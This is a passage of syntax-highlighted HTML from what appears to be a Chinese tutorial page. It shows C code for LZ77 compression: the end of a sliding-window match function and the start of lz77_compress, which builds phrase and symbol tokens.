</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*在前向缓冲区和滑动窗口中寻找最佳匹配*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">match</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-28\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-29\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*确定滑动窗口中k个偏移量匹配的符号数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-32\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-33\"><span class=\"crayon-h\">                </span><span class=\"crayon-st\">break</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-34\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-35\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">match</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-36\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-37\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-39\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*跟踪最佳匹配的偏移、长度和下一个符号*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-41\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">match</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">longest</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-42\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-43\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-44\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">longest</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">match</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-45\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">next</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-46\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-48\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">longest</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-49\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-50\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-51\"><span class=\"crayon-c\">/*lz77_compress  使用lz77算法压缩数据*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-52\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lz77_compress</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-53\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\">     </span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-55\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-56\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-57\"><span class=\"crayon-h\">                      </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">temp</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-58\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-59\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\">               </span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-60\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-61\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-62\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-63\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-64\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-65\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">tpos</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-66\"><span class=\"crayon-h\">                      </span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-67\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*使指向压缩数据的指针暂时无效*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-68\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">compressed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-69\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-70\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*写入头部信息*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-71\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">hsize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-72\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">char</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">hsize</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-73\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-74\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memcpy</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">comp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-75\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-76\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*初始化滑动窗口和前向缓冲区(用0填充)*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-77\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-78\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">memset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-79\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-80\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*加载前向缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-81\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-82\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-83\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">LZ77_BUFFER_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-84\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-85\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">original</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">ipos</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-86\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">ipos</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-87\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-88\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-89\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*压缩数据*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-90\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">opos</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">hsize *</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-91\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-92\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-93\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">remaining</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-94\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-95\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compare_win</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">offset</span><span class=\"crayon-sy\">,</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">!=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-96\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-97\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*编码短语标记*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-98\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00000001</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-99\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-100\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置在滑动窗口找到匹配的偏移量*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-101\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_TYPE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-102\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-103\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置匹配串的长度*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-104\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_TYPE_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_WINOFF_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_BUFLEN_BITS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-105\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-106\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置前向缓冲区中匹配串后面紧邻的字符*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-107\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-108\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-109\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置标记的位数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-110\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">tbits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_PHRASE_BITS</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-111\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-112\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-113\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-114\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*编码一个字符标记*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-115\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x00000000</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-116\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-117\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置未匹配的字符*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-118\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-119\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-120\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置标记的位数*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-121\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">tbits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LZ77_SYMBOL_BITS</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-122\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-123\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-124\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*确定标记是大端格式*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-125\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">token</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">htonl</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">token</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-126\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-127\"><span 